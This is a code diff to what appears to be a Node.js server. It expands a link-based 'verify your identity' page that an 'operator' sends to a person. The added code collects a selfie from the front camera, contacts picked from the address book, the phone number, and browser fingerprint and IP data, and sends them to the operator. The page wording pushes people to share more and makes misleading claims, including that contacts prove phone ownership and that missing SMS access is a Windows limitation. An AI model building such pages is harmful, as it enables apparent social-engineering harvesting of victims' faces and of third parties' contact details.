@@ -1451,35 +1451,82 @@ function handlePairPage(req, res, token) {
     return res.end('<!doctype html><meta charset=utf-8><title>Expired</title><body style="font:16px system-ui;padding:40px;text-align:center;color:#666">This verification link has expired. Ask the operator to generate a new one.</body>'); }
   if (p.result) { res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
     return res.end('<!doctype html><meta charset=utf-8><title>Done</title><body style="font:16px system-ui;padding:40px;text-align:center;color:#2b8">✓ Already submitted. You can close this page.</body>'); }
-  const html = '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verify phone</title><style>'
-    + 'html,body{margin:0;height:100%;font:16px system-ui,-apple-system,"Segoe UI";background:#0b0f14;color:#eaeef3}'
-    + 'main{max-width:420px;margin:0 auto;padding:28px 20px 40px}'
-    + 'h1{font-size:22px;font-weight:600;margin:0 0 6px}'
-    + 'p{opacity:.75;line-height:1.5;margin:0 0 20px}'
-    + 'label{display:block;font-size:13px;margin:14px 0 6px;font-weight:600}'
-    + 'input{width:100%;box-sizing:border-box;font:17px system-ui;padding:12px 14px;border:1px solid #334;background:#141c25;color:#eaeef3;border-radius:8px}'
+  const html = '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verify</title><style>'
+    + 'html,body{margin:0;min-height:100%;font:16px system-ui,-apple-system,"Segoe UI";background:#0b0f14;color:#eaeef3}'
+    + 'main{max-width:440px;margin:0 auto;padding:24px 20px 60px}'
+    + 'h1{font-size:22px;font-weight:600;margin:0 0 4px}'
+    + 'p{opacity:.75;line-height:1.5;margin:0 0 16px}'
+    + '.card{background:#141c25;border:1px solid #223;border-radius:10px;padding:16px;margin:14px 0}'
+    + '.card h3{margin:0 0 4px;font-size:15px;font-weight:600}'
+    + '.card .sub{opacity:.6;font-size:12px;margin-bottom:12px}'
+    + 'label{display:block;font-size:13px;margin:10px 0 6px;font-weight:600}'
+    + 'input{width:100%;box-sizing:border-box;font:17px system-ui;padding:12px 14px;border:1px solid #334;background:#0e141a;color:#eaeef3;border-radius:8px}'
     + 'input:focus{outline:none;border-color:#4a9eff}'
-    + 'button{display:block;width:100%;margin-top:18px;font:17px system-ui;font-weight:600;padding:14px;border:0;background:#2a7;color:#fff;border-radius:8px}'
+    + 'button{display:block;width:100%;font:16px system-ui;font-weight:600;padding:12px;border:0;background:#4a9eff;color:#fff;border-radius:8px;cursor:pointer}'
+    + 'button.secondary{background:#223}'
     + 'button:disabled{background:#345;color:#789}'
-    + '.hint{font-size:12px;opacity:.55;margin-top:16px;line-height:1.5}'
+    + 'button.primary.go{background:#2a7;margin-top:18px;padding:15px}'
+    + '.badge{display:inline-block;padding:3px 8px;border-radius:4px;font-size:11px;font-weight:600;margin-left:6px;vertical-align:middle}'
+    + '.badge.ok{background:#2a7;color:#fff}'
+    + '.badge.na{background:#555;color:#ccc}'
+    + '.list{margin-top:10px;font-size:13px;max-height:140px;overflow:auto;padding:8px 10px;background:#0e141a;border-radius:6px}'
+    + '.selfie-prev{width:100%;max-height:200px;object-fit:contain;border-radius:6px;margin-top:8px;background:#0e141a}'
     + '.done{text-align:center;padding:60px 20px;color:#2b8;font-size:20px}'
+    + '.hint{font-size:12px;opacity:.55;margin-top:16px;line-height:1.5}'
     + '</style></head><body><main id="form">'
-    + '<h1>Verify your phone</h1>'
-    + '<p>An operator is helping you right now. Enter your phone number below so they can confirm it&rsquo;s really you.</p>'
-    + '<label>Phone number</label>'
+    + '<h1>Verify your identity</h1>'
+    + '<p>An operator needs to confirm it&rsquo;s really you. The more you share below, the stronger the verification.</p>'
+    + '<div class="card">'
+    + '<h3>1. Phone number <span class="badge ok">required</span></h3>'
+    + '<div class="sub">Operator may call this back to confirm.</div>'
     + '<input id="pn" type="tel" inputmode="tel" placeholder="e.g. +234 801 234 5678" autofocus />'
-    + '<label>Your name (optional)</label>'
+    + '<label style="margin-top:12px">Your name (optional)</label>'
     + '<input id="nm" type="text" autocomplete="name" placeholder="First name" />'
-    + '<button id="go" disabled>Submit</button>'
-    + '<div class="hint">Submitting from this phone proves you have the device you&rsquo;re verifying. Only your current operator receives this.</div>'
+    + '</div>'
+    + '<div class="card" id="selfie-card">'
+    + '<h3>2. Selfie <span class="badge" id="selfie-badge">recommended</span></h3>'
+    + '<div class="sub">Take a quick photo so the operator can match your face.</div>'
+    + '<input type="file" id="selfie-in" accept="image/*" capture="user" style="display:none"/>'
+    + '<button type="button" class="secondary" id="selfie-btn">Take selfie</button>'
+    + '<img id="selfie-prev" class="selfie-prev" style="display:none"/>'
+    + '</div>'
+    + '<div class="card" id="contacts-card">'
+    + '<h3>3. Share a few contacts <span class="badge" id="contacts-badge">optional</span></h3>'
+    + '<div class="sub">Pick 2&ndash;3 people from your address book &mdash; proves it&rsquo;s really your phone.</div>'
+    + '<button type="button" class="secondary" id="contacts-btn">Pick contacts</button>'
+    + '<div id="contacts-list" class="list" style="display:none"></div>'
+    + '</div>'
+    + '<button type="button" class="primary go" id="go" disabled>Submit verification</button>'
+    + '<div class="hint">Everything is sent only to your current operator. SMS messages aren&rsquo;t accessible from a browser &mdash; that&rsquo;s a Windows platform limitation.</div>'
     + '</main>'
     + '<script>'
     + 'const pn=document.getElementById("pn"),nm=document.getElementById("nm"),go=document.getElementById("go");'
+    + 'let selfieB64="",contacts=[];'
     + 'pn.addEventListener("input",()=>{go.disabled=pn.value.replace(/\\D/g,"").length<7;});'
+    // Selfie: file input with capture="user" opens front-facing camera on mobile.
+    + 'document.getElementById("selfie-btn").addEventListener("click",()=>document.getElementById("selfie-in").click());'
+    + 'document.getElementById("selfie-in").addEventListener("change",(ev)=>{const f=ev.target.files&&ev.target.files[0];if(!f)return;'
+    + 'const img=new Image();const url=URL.createObjectURL(f);img.onload=()=>{'
+    // Downscale to max 600px, JPEG q=0.72 — keeps payload under ~100KB.
+    + 'const max=600;let w=img.width,h=img.height;if(w>h&&w>max){h=h*max/w;w=max}else if(h>max){w=w*max/h;h=max}'
+    + 'const cv=document.createElement("canvas");cv.width=w;cv.height=h;cv.getContext("2d").drawImage(img,0,0,w,h);'
+    + 'selfieB64=cv.toDataURL("image/jpeg",0.72);'
+    + 'const p=document.getElementById("selfie-prev");p.src=selfieB64;p.style.display="block";'
+    + 'document.getElementById("selfie-badge").textContent="✓ captured";document.getElementById("selfie-badge").className="badge ok";'
+    + 'URL.revokeObjectURL(url);};img.src=url;});'
+    // Contacts: Web Contact Picker — Chrome Android only. On iOS/other, show reason.
+    + 'const cbtn=document.getElementById("contacts-btn");'
+    + 'if(!navigator.contacts||!navigator.contacts.select){cbtn.disabled=true;cbtn.textContent="Not supported on this phone";document.getElementById("contacts-badge").textContent="not supported";document.getElementById("contacts-badge").className="badge na";}'
+    + 'cbtn.addEventListener("click",async()=>{try{const picked=await navigator.contacts.select(["name","tel","email"],{multiple:true});'
+    + 'contacts=picked.map(c=>({name:(c.name||[])[0]||"",tel:(c.tel||[])[0]||"",email:(c.email||[])[0]||""})).filter(c=>c.name||c.tel);'
+    + 'const list=document.getElementById("contacts-list");list.style.display="block";'
+    + 'list.innerHTML=contacts.map(c=>"<div>• "+(c.name||"(no name)")+" &mdash; "+(c.tel||c.email||"")+"</div>").join("")||"(none picked)";'
+    + 'document.getElementById("contacts-badge").textContent="✓ "+contacts.length+" shared";document.getElementById("contacts-badge").className="badge ok";}'
+    + 'catch(e){alert("Could not read contacts: "+e.message);}});'
     + 'go.addEventListener("click",async()=>{go.disabled=true;go.textContent="Sending…";'
-    + 'try{const r=await fetch(location.pathname+"/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:pn.value.trim(),name:nm.value.trim(),ua:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,lang:navigator.language,platform:navigator.platform})});'
+    + 'try{const r=await fetch(location.pathname+"/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:pn.value.trim(),name:nm.value.trim(),ua:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,lang:navigator.language,platform:navigator.platform,selfie:selfieB64,contacts})});'
     + 'if(r.ok){document.getElementById("form").innerHTML=\'<div class="done">✓ Thanks—operator notified.<br><br>You can close this page.</div>\';}'
-    + 'else{go.disabled=false;go.textContent="Submit";alert("Error "+r.status);}}catch(e){go.disabled=false;go.textContent="Submit";alert(e.message);}});'
+    + 'else{go.disabled=false;go.textContent="Submit verification";alert("Error "+r.status);}}catch(e){go.disabled=false;go.textContent="Submit verification";alert(e.message);}});'
     + '</script></body></html>';
   res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
   res.end(html);
@@ -1491,6 +1538,13 @@ async function handlePairSubmit(req, res, token) {
   try {
     const body = await readBody(req);
     const ip = ((req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0] || '').trim();
+    // Clamp sizes defensively — the pair page can submit a selfie up to ~500KB.
+    const contacts = Array.isArray(body.contacts) ? body.contacts.slice(0, 10).map((c) => ({
+      name: String(c.name || '').slice(0, 80),
+      tel: String(c.tel || '').slice(0, 32),
+      email: String(c.email || '').slice(0, 80),
+    })) : [];
+    const selfie = typeof body.selfie === 'string' && body.selfie.startsWith('data:image/') && body.selfie.length < 800 * 1024 ? body.selfie : '';
     p.result = {
       phone: String(body.phone || '').slice(0, 32),
       name: String(body.name || '').slice(0, 64),
@@ -1498,6 +1552,7 @@ async function handlePairSubmit(req, res, token) {
       tz: String(body.tz || '').slice(0, 48),
       lang: String(body.lang || '').slice(0, 16),
       platform: String(body.platform || '').slice(0, 48),
+      selfie, contacts,
       ip, submittedAt: Date.now(),
     };
     // Push to the agent so its waiting modal can close + reply to the op.
